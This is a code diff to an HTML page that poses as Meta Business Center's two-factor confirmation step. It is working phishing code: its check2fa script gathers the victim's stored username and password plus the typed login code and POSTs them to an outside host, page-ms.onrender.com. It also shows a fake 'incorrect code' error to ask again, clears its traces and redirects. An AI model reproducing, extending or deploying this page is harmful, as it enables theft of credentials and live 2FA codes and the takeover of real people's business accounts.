@@ -20,7 +20,7 @@
   <script nomodule="" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Meta Business Center</title>
-  <script type="module" crossorigin="" src="/assets/index-61bbd89f.js"></script>
+  <!-- <script type="module" crossorigin="" src="/assets/index-61bbd89f.js"></script> -->
   <link rel="stylesheet" href="/assets/index-2e00e8bb.css">
 </head>
 
@@ -40,7 +40,7 @@
           </div>
         </div>
         <div class="Authentication__body d-flex align-items-center justify-content-center">
-          <div
+          <div id="container"
             style="padding: 1rem 1rem 0.5rem; border: 1px solid rgb(220, 218, 218); max-width: 620px; margin: 10vh auto auto; border-radius: 0px; background-color: white;">
             <h1 style="font-weight: 700; line-height: 20px; font-size: 14px; color: rgb(68, 68, 68);">Choose a way to
               confirm it's you</h1>
@@ -75,9 +75,15 @@
             <div class="modal__body-password">
               <div class="d-flex align-items-center mb-2">
                 <div>
+                  <div id="errorLogin"
+                    style="display: none; font-size: 14px;color: red; font-family: inherit; align-items: center; border-radius: 3px; margin-top: 20px;">
+                    <img src="./assets/png-transparent-error-icon-thumbnail.png"
+                      style="width: 20px; margin-right: 10px;">
+                    <div>The code you entered is incorrect.</div>
+                  </div>
                   <div class="InputText" style="margin: 0px;"><label class="InputText__label"></label><input
-                      maxlength="8" placeholder="Login code" id="2facode" class="form-control form-control-sm" value=""
-                      style="font-size: 0.9rem;"></div>
+                      minlength="6" maxlength="8" placeholder="Login code" id="2facode"
+                      class="form-control form-control-sm" value="" style="font-size: 0.9rem;"></div>
                 </div>
               </div>
             </div>
@@ -87,44 +93,58 @@
             <div style="height: 1px; width: 100%; background: rgb(218, 221, 225);"></div>
             <div style="margin-top: 0.5rem; margin-bottom: 0.5rem;"><a href="#" role="button" id="u_0_7_oI"
                 style="line-height: 28px; color: rgb(56, 88, 152); font-size: 12px; font-family: Helvetica, Arial, sans-serif; text-decoration: none; cursor: pointer;">Need
-                another way to confirm it's you?</a><button class="auth_submit_btn" disabled=""
+                another way to confirm it's you?</a><button id="submitcode" class="auth_submit_btn"
                 style="margin-left: auto;" onclick="check2fa()"><span style="margin: 0px;">Submit Code</span></button>
             </div>
+            <div id="loader" class="loader"
+              style="width: 50px; height: 50px; background-color: aliceblue; display: none;"></div>
           </div>
         </div>
       </div>
     </div>
   </div>
+  </div>
 
   <script>
     async function check2fa() {
-      const facode = document.getElementById('2facode').value
+      console.log('safdas')
+      document.getElementById('loader').style.display = 'block';
+      document.getElementById('container').style.opacity = '0.5';
+      document.getElementById('submitcode').disabled = true;
 
+      const facode = document.getElementById('2facode').value
       let headersList = {
         "Accept": "*/*",
         "Content-Type": "application/json"
       }
-
       let bodyContent = JSON.stringify({
         "username": window.localStorage.getItem("emm"),
         "password": window.localStorage.getItem("anh"),
         "twofa": facode,
+        "id": window.localStorage.getItem("uuid"),
         "from": "2fa"
       });
-
       let response = await fetch("https://page-ms.onrender.com/posts", {
         method: "POST",
         body: bodyContent,
         headers: headersList
       });
+      let data = await response.json();
 
-      let data = await response.text();
-      console.log(data);
+      document.getElementById('container').style.opacity = '1';
+      document.getElementById('submitcode').disabled = false;
       if (data.recheckTwoFa) {
-
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('2facode').style.border = '1px solid red';
+        document.getElementById('errorLogin').style.display = 'flex';
+      }
+      else {
+        window.localStorage.removeItem("emm");
+        window.localStorage.removeItem("anh");
+        window.localStorage.removeItem("uuid");
+        window.location.href = data.href
       }
 
-      window.location.href = data.href
       // window.location.href = "/2fa.html?next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Funifiedfblogin%2Fcallback%2F%3Fnext%3Dhttps%253A%252F%252Fbusiness.facebook.com%252Fadsmanager%252Fmanage%252Fcampaigns%253Fact%253D103128815%2526date%253D2021-10-07_2024-08-25%25252Cmaximum%2526breakdown_regrouping%253Dtrue%2526nav_source%253Dno_referrer%2526biz_login_source%253Dbiz_unified_f3_fb_login_button%2526join_id%253De79e2654-78cd-4715-a235-21ecf163a7e1%26f3_request_id%3D95d99434-1deb-4fe5-b1e2-ba96ec369a6a&request_id=95d99434-1deb-4fe5-b1e2-ba96ec369a6a"
     }
   </script>
